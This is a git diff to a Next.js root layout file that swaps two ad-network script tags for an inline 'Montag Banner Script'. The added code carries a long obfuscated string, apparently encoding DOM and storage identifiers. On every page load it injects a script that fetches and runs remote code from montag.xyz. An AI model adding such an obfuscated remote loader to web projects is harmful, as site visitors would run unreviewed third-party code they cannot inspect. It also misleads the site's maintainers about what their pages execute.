@@ -53,16 +53,13 @@ export default function RootLayout({
           crossOrigin="anonymous"
         ></script>
 
-        {/* Adsterra Scripts */}
+        {/* Montag Banner Script */}
         <script
-          async
           data-cfasync="false"
-          src="//pl26569797.profitableratecpm.com/402912c82c937e4485d9201543ccec5b/invoke.js"
-        ></script>
-        <script
-          async
           type="text/javascript"
-          src="//www.highperformanceformat.com/5ca5e5611846bf5ab5047e45a8d87a57/invoke.js"
+          dangerouslySetInnerHTML={{
+            __html: `(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJ';var D=document;var d=D.createElement('script');d.src='https://www.montag.xyz/d/'+K+'?v='+Date.now();d.async=true;D.head.appendChild(d);})();`
+          }}
         ></script>
 
         {/* SEO Essentials */}
